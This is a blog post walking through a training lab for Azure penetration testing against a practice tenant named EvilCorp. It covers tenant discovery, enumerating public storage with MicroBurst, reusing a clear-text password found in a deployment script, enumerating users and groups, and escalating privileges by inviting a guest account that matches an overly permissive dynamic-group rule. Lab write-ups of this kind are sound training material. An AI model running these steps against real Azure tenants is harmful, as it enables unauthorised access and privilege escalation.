<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Introduction to Azure Pentesting ☁️ ::
        bhavsec — portfolio &amp; blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="More than 95 percent of Fortune 500 companies use Azure! Azure AD is one of world&amp;rsquo;s largest web-based identity provider. Having the ability to understand and hack (thus securing) Azure is a skill that is in huge demand.
This blog covers the lab work done in Introduction to Azure Penetration Testing labs &amp;amp; training provided by Nikhil Mittal and Altered Security.
Course Video : https://youtu.be/5dVSHuCEG2w
Free Labs: https://azure.enterprisesecurity.io
Discovery We just know the name of the target organization - EvilCorp."
/>
<meta
  name="keywords"
  content="bhavsec, cybersecurity, penetration testing"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://bhavsec.com/posts/intro-to-azure-pentesting/" />





<link rel="stylesheet" href="../../assets/style.css" />

<link rel="stylesheet" href="../../style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="../../img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="../../img/favicon.png" />


<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>

<meta name="twitter:title" content="Introduction to Azure Pentesting ☁️"/>
<meta name="twitter:description" content="More than 95 percent of Fortune 500 companies use Azure! Azure AD is one of world&rsquo;s largest web-based identity provider. Having the ability to understand and hack (thus securing) Azure is a skill that is in huge demand.
This blog covers the lab work done in Introduction to Azure Penetration Testing labs &amp; training provided by Nikhil Mittal and Altered Security.
Course Video : https://youtu.be/5dVSHuCEG2w
Free Labs: https://azure.enterprisesecurity.io
Discovery We just know the name of the target organization - EvilCorp."/>



<meta property="og:title" content="Introduction to Azure Pentesting ☁️" />
<meta property="og:description" content="More than 95 percent of Fortune 500 companies use Azure! Azure AD is one of world&rsquo;s largest web-based identity provider. Having the ability to understand and hack (thus securing) Azure is a skill that is in huge demand.
This blog covers the lab work done in Introduction to Azure Penetration Testing labs &amp; training provided by Nikhil Mittal and Altered Security.
Course Video : https://youtu.be/5dVSHuCEG2w
Free Labs: https://azure.enterprisesecurity.io
Discovery We just know the name of the target organization - EvilCorp." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bhavsec.com/posts/intro-to-azure-pentesting/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-06T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-01-06T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />







  </head>
  <body class="">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="http://bhavsec.com/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text">
      bhavsec/</span>
    <span class="logo__text" style="color:red">posts/</span>
    <span class="logo__cursor"></span>

  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="../../resume">📄 resume</a></li>
        
      
        
          <li><a href="../../posts">📚 blog</a></li>
        
      
        
          <li><a href="../../whoami">🔎 whoami </a></li>
        
      
        
          <li><a href="../../resources">🚀 resources</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="../../resume">📄 resume</a></li>
      
    
      
        <li><a href="../../posts">📚 blog</a></li>
      
    
      
        <li><a href="../../whoami">🔎 whoami </a></li>
      
    
      
        <li><a href="../../resources">🚀 resources</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Introduction to Azure Pentesting ☁️</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2022-01-06
        </span>

        
          
        
      

      


      
    </div>

    
      <span class="post-tags">
        
          <a href="../../tags/azure/index.html">#azure</a>&nbsp;
        
          <a href="../../tags/cloudsecurity/index.html">#cloudsecurity</a>&nbsp;
        
          <a href="../../tags/pentesting/index.html">#pentesting</a>&nbsp;
        
          <a href="../../tags/activedirectory/index.html">#activedirectory</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      
        
        <h2>Table of Contents</h2>
        <aside class="table-of-contents"><nav id="TableOfContents">
  <ul>
    <li><a href="index.html#discovery">Discovery</a></li>
    <li><a href="index.html#initial-access">Initial Access</a></li>
    <li><a href="index.html#enumeration">Enumeration</a></li>
    <li><a href="index.html#privilege-escalation">Privilege Escalation</a></li>
    <li><a href="index.html#lateral-movement">Lateral Movement</a></li>
  </ul>
</nav></aside>
        
      
      <p>More than 95 percent of Fortune 500 companies use Azure! Azure AD is one of world&rsquo;s largest web-based identity provider. Having the ability to understand and hack (thus securing) Azure is a skill that is in huge demand.</p>
<p>This blog covers the lab work done in Introduction to Azure Penetration Testing labs &amp; training provided by <a href="https://twitter.com/nikhil_mitt">Nikhil Mittal</a> and <a href="https://www.alteredsecurity.com">Altered Security</a>.</p>
<p>Course Video : <a href="https://youtu.be/5dVSHuCEG2w">https://youtu.be/5dVSHuCEG2w</a></p>
<p>Free Labs: <a href="https://azure.enterprisesecurity.io">https://azure.enterprisesecurity.io</a></p>
<h2 id="discovery">Discovery</h2>
<p>We just know the name of the target organization - EvilCorp. Let us check if the target organization is using Azure AD! We can use the following URL to get some details! Note that here we are assuming that Evilcorp is using the domain name that is automatically assigned in Azure based on the tenant name. In addition, there is no need to know a valid username to use the below URL:</p>
<pre><code>https://login.microsoftonline.com/getuserrealm.srf?login=USERNAME@evilcorp.onmicrosoft.com&amp;xml=1
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;RealmInfo</span> <span style="color:#a6e22e">Success=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;State&gt;</span>4<span style="color:#f92672">&lt;/State&gt;</span>
<span style="color:#f92672">&lt;UserState&gt;</span>1<span style="color:#f92672">&lt;/UserState&gt;</span>
<span style="color:#f92672">&lt;Login&gt;</span>USERNAME@evilcorp.onmicrosoft.com<span style="color:#f92672">&lt;/Login&gt;</span>
<span style="color:#f92672">&lt;NameSpaceType&gt;</span>Managed<span style="color:#f92672">&lt;/NameSpaceType&gt;</span>
<span style="color:#f92672">&lt;DomainName&gt;</span>evilcorp.onmicrosoft.com<span style="color:#f92672">&lt;/DomainName&gt;</span>
<span style="color:#f92672">&lt;IsFederatedNS&gt;</span>false<span style="color:#f92672">&lt;/IsFederatedNS&gt;</span>
<span style="color:#f92672">&lt;FederationBrandName&gt;</span>Evil Corporation<span style="color:#f92672">&lt;/FederationBrandName&gt;</span>
<span style="color:#f92672">&lt;CloudInstanceName&gt;</span>microsoftonline.com<span style="color:#f92672">&lt;/CloudInstanceName&gt;</span>
<span style="color:#f92672">&lt;CloudInstanceIssuerUri&gt;</span>urn:federation:MicrosoftOnline<span style="color:#f92672">&lt;/CloudInstanceIssuerUri&gt;</span>
<span style="color:#f92672">&lt;/RealmInfo&gt;</span>
</code></pre></div><p>&lsquo;NameSpaceType&rsquo; Managed means that the target organization is using Azure!</p>
<p>Next, find out the Tenant ID for evilcorp.onmicrosoft.com</p>
<pre><code>https://login.microsoftonline.com/evilcorp.onmicrosoft.com/.well-known/openid-configuration
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#f92672">&#34;token_endpoint&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/token&#34;</span>,
  <span style="color:#f92672">&#34;token_endpoint_auth_methods_supported&#34;</span>:[<span style="color:#e6db74">&#34;client_secret_post&#34;</span>,<span style="color:#e6db74">&#34;private_key_jwt&#34;</span>,<span style="color:#e6db74">&#34;client_secret_basic&#34;</span>],
  <span style="color:#f92672">&#34;jwks_uri&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/common/discovery/keys&#34;</span>,
  <span style="color:#f92672">&#34;response_modes_supported&#34;</span>:[<span style="color:#e6db74">&#34;query&#34;</span>,<span style="color:#e6db74">&#34;fragment&#34;</span>,<span style="color:#e6db74">&#34;form_post&#34;</span>],
  <span style="color:#f92672">&#34;subject_types_supported&#34;</span>:[<span style="color:#e6db74">&#34;pairwise&#34;</span>],
  <span style="color:#f92672">&#34;id_token_signing_alg_values_supported&#34;</span>:[<span style="color:#e6db74">&#34;RS256&#34;</span>],
  <span style="color:#f92672">&#34;response_types_supported&#34;</span>:[<span style="color:#e6db74">&#34;code&#34;</span>,<span style="color:#e6db74">&#34;id_token&#34;</span>,<span style="color:#e6db74">&#34;code id_token&#34;</span>,<span style="color:#e6db74">&#34;token id_token&#34;</span>,<span style="color:#e6db74">&#34;token&#34;</span>],
  <span style="color:#f92672">&#34;scopes_supported&#34;</span>:[<span style="color:#e6db74">&#34;openid&#34;</span>],
  <span style="color:#f92672">&#34;issuer&#34;</span>:<span style="color:#e6db74">&#34;https://sts.windows.net/711c59fe-8dee-40c0-adc1-ed08f738de43/&#34;</span>,
  <span style="color:#f92672">&#34;microsoft_multi_refresh_token&#34;</span>:<span style="color:#66d9ef">true</span>,
  <span style="color:#f92672">&#34;authorization_endpoint&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/authorize&#34;</span>,
  <span style="color:#f92672">&#34;device_authorization_endpoint&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/devicecode&#34;</span>,
  <span style="color:#f92672">&#34;http_logout_supported&#34;</span>:<span style="color:#66d9ef">true</span>,
  <span style="color:#f92672">&#34;frontchannel_logout_supported&#34;</span>:<span style="color:#66d9ef">true</span>,
  <span style="color:#f92672">&#34;end_session_endpoint&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/logout&#34;</span>,
  <span style="color:#f92672">&#34;claims_supported&#34;</span>:[<span style="color:#e6db74">&#34;sub&#34;</span>,<span style="color:#e6db74">&#34;iss&#34;</span>,<span style="color:#e6db74">&#34;cloud_instance_name&#34;</span>,<span style="color:#e6db74">&#34;cloud_instance_host_name&#34;</span>,<span style="color:#e6db74">&#34;cloud_graph_host_name&#34;</span>,<span style="color:#e6db74">&#34;msgraph_host&#34;</span>,<span style="color:#e6db74">&#34;aud&#34;</span>,<span style="color:#e6db74">&#34;exp&#34;</span>,<span style="color:#e6db74">&#34;iat&#34;</span>,<span style="color:#e6db74">&#34;auth_time&#34;</span>,<span style="color:#e6db74">&#34;acr&#34;</span>,<span style="color:#e6db74">&#34;amr&#34;</span>,<span style="color:#e6db74">&#34;nonce&#34;</span>,<span style="color:#e6db74">&#34;email&#34;</span>,<span style="color:#e6db74">&#34;given_name&#34;</span>,<span style="color:#e6db74">&#34;family_name&#34;</span>,<span style="color:#e6db74">&#34;nickname&#34;</span>],
  <span style="color:#f92672">&#34;check_session_iframe&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/oauth2/checksession&#34;</span>,
  <span style="color:#f92672">&#34;userinfo_endpoint&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/openid/userinfo&#34;</span>,
  <span style="color:#f92672">&#34;kerberos_endpoint&#34;</span>:<span style="color:#e6db74">&#34;https://login.microsoftonline.com/711c59fe-8dee-40c0-adc1-ed08f738de43/kerberos&#34;</span>,
  <span style="color:#f92672">&#34;tenant_region_scope&#34;</span>:<span style="color:#e6db74">&#34;AS&#34;</span>,
  <span style="color:#f92672">&#34;cloud_instance_name&#34;</span>:<span style="color:#e6db74">&#34;microsoftonline.com&#34;</span>,
  <span style="color:#f92672">&#34;cloud_graph_host_name&#34;</span>:<span style="color:#e6db74">&#34;graph.windows.net&#34;</span>,
  <span style="color:#f92672">&#34;msgraph_host&#34;</span>:<span style="color:#e6db74">&#34;graph.microsoft.com&#34;</span>,
  <span style="color:#f92672">&#34;rbac_url&#34;</span>:<span style="color:#e6db74">&#34;https://pas.windows.net&#34;</span>
}
</code></pre></div><pre><code>Tenant ID: 711c59fe-8dee-40c0-adc1-ed08f738de43
</code></pre><p>We can also use tools like AADInternals (<a href="https://github.com/Gerenios/AADInternals">https://github.com/Gerenios/AADInternals</a>) for finding the above!</p>
<p>We can use MicroBuster to look for services used by EvilCorp.</p>
<p>Let us first find out the services used by the target tenant:</p>
<pre><code>PS C:\AzAD\Tools&gt; Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1

Imported Az MicroBurst functions
AzureAD module not installed, checking other modules
MSOnline module not installed, checking other modules
Imported Misc MicroBurst functions
Imported Azure REST API MicroBurst functions
</code></pre><pre><code>PS C:\AzAD\Tools&gt; Invoke-EnumerateAzureSubDomains -Base evilcorp

Subdomain                              Service
---------                              -------
evilcorp.mail.protection.outlook.com Email
evilcorp.onmicrosoft.com             Microsoft Hosted Domain
evilcorp.blob.core.windows.net       Storage Accounts - Blobs
evilcorp.file.core.windows.net       Storage Accounts - Files
evilcorp.queue.core.windows.net      Storage Accounts - Queues
evilcorp.table.core.windows.net      Storage Accounts - Tables
</code></pre><p>The target tenant is using storage accounts! Our next step would be to check if there are any publicly accessible storage accounts.</p>
<h2 id="initial-access">Initial Access</h2>
<p>Let&rsquo;s use another function from Microbuster to check if there are any storage accounts with anonymous access. Run the below command in the PowerShell session where you imported MicroBuster.</p>
<pre><code>PS C:\AzAD\Tools&gt; Invoke-EnumerateAzureBlobs -Base evilcorp

Found Storage Account - evilcorp.blob.core.windows.net
Found Container - evilcorp.blob.core.windows.net/configuration
Public File Available:
https://evilcorp.blob.core.windows.net/configuration/PAS_Deployment_Script.ps1
</code></pre><p>There is a script available in a container called &lsquo;configuration&rsquo;. Let&rsquo;s check out its contents!</p>
<p>The script seems to be a VM deployment script and it contains a username and password in clear-text in very first lines!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$password = ConvertTo-SecureString <span style="color:#e6db74">&#39;ZuqK&amp;ijv0085VnCI&amp;#&#39;</span> -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;PIMUser@evilcorp.onmicrosoft.com&#39;</span>, $Password)
Connect-AzAccount -Credential $Cred

$resourceGroup = <span style="color:#e6db74">&#34;PIMManagement&#34;</span>
$location = <span style="color:#e6db74">&#34;Germany West Central&#34;</span>
$vmName = <span style="color:#e6db74">&#34;PAS&#34;</span>
$Subscription = <span style="color:#e6db74">&#34;27ebe5b9-6e27-425a-8117-eeaab022575f&#34;</span>

<span style="color:#75715e"># Set a variable for the image version in Tenant 1 using the full image ID of the image version</span>
$image = <span style="color:#e6db74">&#34;/subscriptions/$Subscription/resourceGroups/$resourceGroup/providers/Microsoft.Compute/galleries/PIM/images/PAS/versions/2.0&#34;</span>

<span style="color:#75715e"># Create user object</span>
$cred = Get-Credential -Message <span style="color:#e6db74">&#34;Enter a username and password for the virtual machine.&#34;</span>

<span style="color:#75715e"># Create a resource group</span>
New-AzResourceGroup -Name $resourceGroup -Location $location

<span style="color:#75715e"># Networking pieces</span>
$subnetConfig = New-AzVirtualNetworkSubnetConfig -Name mySubnet -AddressPrefix 192.168.1.0/24
$vnet = New-AzVirtualNetwork -ResourceGroupName $resourceGroup -Location $location `
  -Name MYvNET -AddressPrefix 192.168.0.0/16 -Subnet $subnetConfig
$pip = New-AzPublicIpAddress -ResourceGroupName $resourceGroup -Location $location `
  -Name <span style="color:#e6db74">&#34;mypublicdns</span>$(Get-Random)<span style="color:#e6db74">&#34;</span> -AllocationMethod Static -IdleTimeoutInMinutes 4
$nsgRuleRDP = New-AzNetworkSecurityRuleConfig -Name myNetworkSecurityGroupRuleRDP  -Protocol Tcp `
  -Direction Inbound -Priority 1000 -SourceAddressPrefix * -SourcePortRange * -DestinationAddressPrefix * `
  -DestinationPortRange 3389 -Access Allow
$nsg = New-AzNetworkSecurityGroup -ResourceGroupName $resourceGroup -Location $location `
  -Name myNetworkSecurityGroup -SecurityRules $nsgRuleRDP
$nic = New-AzNetworkInterface -Name myNic -ResourceGroupName $resourceGroup -Location $location `
  -SubnetId $vnet.Subnets[0].Id -PublicIpAddressId $pip.Id -NetworkSecurityGroupId $nsg.Id

<span style="color:#75715e"># Create a virtual machine configuration using the $image variable to specify the image</span>
$vmConfig = New-AzVMConfig -VMName $vmName -VMSize Standard_D1_v2 | `
Set-AzVMOperatingSystem -Windows -ComputerName $vmName -Credential $cred | `
Set-AzVMSourceImage -Id $image | `
Add-AzVMNetworkInterface -Id $nic.Id

<span style="color:#75715e"># Create a virtual machine</span>
New-AzVM -ResourceGroupName $resourceGroup -Location $location -VM $vmConfig
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<p>Let&rsquo;s use the credentials of the user PIMUser that we got above and connect to the evilcorp tenant! Make sure that the Azure AD and Az PowerShell modules are installed on the attack VM that you have setup.</p>
<pre><code>PS C:\AzAD\Tools&gt; Import-Module -Name AzureAD

PS C:\AzAD\Tools&gt; $password = ConvertTo-SecureString 'ZuqK&amp;ijv0085VnCI&amp;#' -AsPlainText -Force

PS C:\AzAD\Tools&gt; $creds = New-Object System.Management.Automation.PSCredential('PIMUser@evilcorp.onmicrosoft.com', $password)

PS C:\AzAD\Tools&gt; Connect-AzureAD -Credential $creds

Account                            Environment TenantId                             TenantDomain               AccountType
-------                            ----------- --------                             ------------               -----------
PIMUser@evilcorp.onmicrosoft.com AzureCloud  711c59fe-8dee-40c0-adc1-ed08f738de43 evilcorp.onmicrosoft.com User

</code></pre><p>Use the following commands from the Azure AD module to enumerate the tenant.</p>
<p><strong>Enumerate Users:</strong></p>
<pre><code>
PS C:\AzAD\Tools&gt; Get-AzureADUser -All $true

ObjectId                             DisplayName            UserPrincipalName
--------                             -----------            -----------------
909380cc-bb5c-46ab-863e-52bbf5209908 abusepim               abusepimadmin_robertaaron.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
8ec3e815-2e2d-4309-b7d9-5c3bbc0c5851 FNU LNU                adarshvs_0xnullsec.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
c6739d48-75f6-4eb9-8488-896739f1ebd7 Gonzalo Aguilar        admin_6h4ackdomain.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
5f34313a-0761-464d-a2c0-77d46ab51f50 Gaurav Anand           admin_adminpentesterhero.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
5bed9164-8609-49c0-9c25-30ab1953c9a1 David Wordliczek       admin_azpentestsecurity.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
9e11f146-2347-46e0-b15d-5330a1dd236e pragya johari          admin_azurettesting12345.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
2764a1a8-a902-41b2-bd63-68622732443a FNU LNU                admin_cyberm4nny.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
9b74f7b5-ab77-4dd2-8d0b-f1be9ab836c1 Saravana Kumar         admin_empirecorp.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
82965bf1-daf2-4acc-9a23-13c36516811b Archit Aggarwal        admin_mynewdomainarchit.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
499c92de-17f4-4d6e-bb47-5cd11c351a2b acey acey              admin_notevilcorp.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
11f8f7a6-7595-4b3f-8bb5-74cc4644b42b FNU LNU                admin_redteam777.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
67c985d0-291b-4fe1-af08-e6f0ca0c40f8 Robert Aaron           admin_robertaaron.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
8b755706-5a93-4134-bd72-cd79bb8ef509 Ross Moore             admin_securitychat.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
965c7e26-18e2-4454-a51c-118adaff56c2 FNU LNU                admin_wdssa.onmicrosoft.com#EXT#@evilcorp.onmicrosoft.com
faca4d80-e954-42d2-af05-3a0523e61d41 JPAttacker             admin_pitcairntest.onmicrosft.com#EXT#@evilcorp.onmicrosoft.com
d19c7b88-f0dd-48e4-9c27-e2b6e15bc696 Alexander S Evans      AlexanderSEvans@evilcorp.onmicrosoft.com
7b1c09cd-2552-4d3d-b65b-13fb7baa8961 Alex J Allen           AlexJAllen@evilcorp.onmicrosoft.com
77539ddc-6856-4c3d-8967-1cb6efaa6470 Alfred P Fleming       AlfredPFleming@evilcorp.onmicrosoft.com
a84c8225-3c31-4fd5-8581-3a362886dab5 Andrew H Carnes        AndrewHCarnes@evilcorp.onmicrosoft.com
b4ff45fe-7535-4e8c-be27-f70ecc6e726e Andrew M Edwards       AndrewMEdwards@evilcorp.onmicrosoft.com
e0b308bd-c5da-45f4-92e6-690a5d943a7e Anna C House           AnnaCHouse@evilcorp.onmicrosoft.com
b974968d-2cf9-4aa7-beb5-abe8032eae2f Anthony S Duran        AnthonySDuran@evilcorp.onmicrosoft.com
4510cd10-1766-45ac-b247-ee44c8968d16 Antonio K Bell         AntonioKBell@evilcorp.onmicrosoft.com
deb96599-f2a2-4e17-affb-179c1d8f411a Arthur J Randall       ArthurJRandall@evilcorp.onmicrosoft.com
...
</code></pre><p><strong>Enumerate Groups:</strong></p>
<pre><code>PS C:\AzAD\Tools&gt; Get-AzureADGroup -All $true

ObjectId                             DisplayName         Description
--------                             -----------         -----------
359dfa24-0a48-495d-8646-b8a9ab01c13d Finance
35bd7eee-d537-474f-b9a3-9756a8f0ba68 Marketing
49e58be7-16fd-48ec-a9e5-f40feef4adf6 Network Operations
58764583-5791-4627-8731-8411db4ba338 Human Resources
62f656b3-e8c9-452c-85ce-104a8d0baaf5 Security Operations
750d8501-0ad2-4039-b587-993794f6cbd7 PIMAdmins           Members of this group have privileges to manage privileged identities.
777643e6-e814-4abb-8caf-195a3e859325 HelpDesk
80c6d793-acc0-4ba6-bf17-d4048763999b GRC
80f8306b-fe8c-4f1e-9474-1457d4361375 DevOps
a8418db9-8153-43ef-b37e-59fb7d88aaff Network Security
c85146db-e493-4708-bbeb-38eb46441c62 Hardware Mgmt
ff51087c-6a1a-4304-af8c-7e446027e86d Sales
</code></pre><p>Let&rsquo;s check if we can access any azure resource as the current user. This will also help in checking if the &lsquo;PIMAdmin&rsquo; group has any permissions on Azure resources.</p>
<p>Run the following command in a new PowerShell session to connect to the evilcorp tenant as PIMUser using Az PowerShell module:</p>
<pre><code>PS C:\AzAD\Tools&gt; $password = ConvertTo-SecureString 'ZuqK&amp;ijv0085VnCI&amp;#' -AsPlainText -Force
PS C:\AzAD\Tools&gt; $creds = New-Object System.Management.Automation.PSCredential('PIMUser@evilcorp.onmicrosoft.com', $password)
PS C:\AzAD\Tools&gt; Connect-AzAccount -Credential $creds

Account                            SubscriptionName TenantId                             Environment
-------                            ---------------- --------                             -----------
PIMUser@evilcorp.onmicrosoft.com                  711c59fe-8dee-40c0-adc1-ed08f738de43 AzureCloud

</code></pre><p>List the Azure resources where PIMUser has at least read access:</p>
<pre><code>PS C:\AzAD\Tools&gt; Get-AzResource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : CloseError: (:) [Get-AzResource], ValidationException
    + FullyQualifiedErrorId : Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
</code></pre><p>The error that we got means that the user PIMUser has no access to any of the Azure resources. So, as PIMUser we are limited to Azure AD.</p>
<p>We may like to enumerate if there are Dynamic Groups. As discussed in the course, dynamic groups allow membership based on rules and it may be possible to abuse an overly permissive rule!</p>
<p>Let&rsquo;s use the Azure AD Preview module to list dynamic groups. We are using the Azure AD Preview module as the Azure AD module is unable to list the membership rule!</p>
<p>Use the below command to list Dynamic Groups. Note that we are first removing the Azure AD module from current PowerShell session and then importing the Azure AD Preview module. Double check the version of the AzureADPreview module for the correct path.</p>
<pre><code>PS C:\AzAD\Tools&gt; Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}

Id                                   DisplayName Description
--                                   ----------- -----------
750d8501-0ad2-4039-b587-993794f6cbd7 PIMAdmins   Members of this group have privileges to manage privileged identities.
</code></pre><p>Let&rsquo;s check what is the Membership Rule for the dynamic group &lsquo;PIMAdmins&rsquo;. Run the below command using Azure AD Preview module:</p>
<pre><code>
PS C:\AzAD\Tools&gt; Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} | select MembershipRule 

MembershipRule
--------------
(user.mail -contains &quot;pim&quot;) or (user.mail -contains &quot;pimadmin&quot;) or (user.mail -contains &quot;operations&quot;) and (user.userType -eq &quot;guest&quot;)
</code></pre><p>So, the membership rule makes anyone who is a Guest (notice the &lsquo;and&rsquo; rule) and has &lsquo;pim&rsquo;, &lsquo;pimadmin&rsquo; or &lsquo;operation&rsquo; in their email ID to be a member!</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>We have to invite a user who has &lsquo;pim&rsquo;, &lsquo;pimadmin&rsquo; or &lsquo;operation&rsquo; in their email ID to get membership of the PIMAdmins group. We will use the attacker tenant that you created as detailed in the &lsquo;Lab Prerequisites&rsquo;.</p>
<p>Use the below command from the Azure AD module to invite a guest. Please note that I am using a guest from a tenant that I created. You have to use your own attacker tenant that you created as detailed in the &lsquo;Lab Prerequisites&rsquo;. Make sure that the invited user has email that contains &lsquo;pim&rsquo;, &lsquo;pimadmin&rsquo; or &lsquo;operation&rsquo; and you choose a unique value for the &lsquo;InvitedUserDisplayName&rsquo; below:</p>
<pre><code>PS C:\Windows\system32&gt; New-AzureADMSInvitation -InvitedUserDisplayName &quot;InvitedAttacker1&quot; -InvitedUserEmailAddress &quot;pim@bhavsec.onmicrosoft.com&quot; -InviteRedirectURL https://portal.azure.com -SendInvitationMessage $true


Id                      : 3c0cf9f0-f252-4945-8ff7-80b8fb2760ab
InvitedUserDisplayName  : InvitedAttacker1
InvitedUserEmailAddress : pim@bhavsec.onmicrosoft.com
SendInvitationMessage   : True
InviteRedeemUrl         : https://login.microsoftonline.com/redeem?rd=https%3a%2f%2finvitations.microsoft.com%2fredeem%
                          2f%3ftenant%3d711c59fe-8dee-40c0-adc1-ed08f738de43%26user%3d3c0cf9f0-f252-4945-8ff7-80b8fb276
                          0ab%26ticket%3dQmWDn95cihYOkq0sowcu7SYe36iuGy73H93Rcus0wvA%253d%26ver%3d2.0
InviteRedirectUrl       : https://portal.azure.com/
InvitedUser             : class User {
                            Id: 502c8c63-0e09-4d11-a00d-3145406d85b0
                            OdataType:
                          }

InvitedUserMessageInfo  : class InvitedUserMessageInfo {
                            CcRecipients: System.Collections.Generic.List`1[Microsoft.Open.MSGraph.Model.Recipient]
                            CustomizedMessageBody:
                            MessageLanguage:
                          }

InvitedUserType         : Guest
Status                  : PendingAcceptance
</code></pre><p>Copy the InviteRedeemUrl and browse to it using a web browser. Login as the user that you invited and accept the permissions!</p>
<pre><code>https://login.microsoftonline.com/redeem?rd=https%3a%2f%2finvitations.microsoft.com%2fredeem%2f%3ftenant%3d711c59fe-8dee-40c0-adc1-ed08f738de43%26user%3d3c0cf9f0-f252-4945-8ff7-80b8fb2760ab%26ticket%3dQmWDn95cihYOkq0sowcu7SYe36iuGy73H93Rcus0wvA%253d%26ver%3d2.0
</code></pre><p><img src="http://bhavsec.com/img/posts/intro-to-azure-pentesting/1.png" alt=""></p>
<p>After login you will be redirected to <a href="https://portal.zure.com">https://portal.zure.com</a>, you may need to switch directory to go to EvilCorp tenant. See the screenshots below</p>
<p><img src="http://bhavsec.com/img/posts/intro-to-azure-pentesting/2.png" alt=""></p>
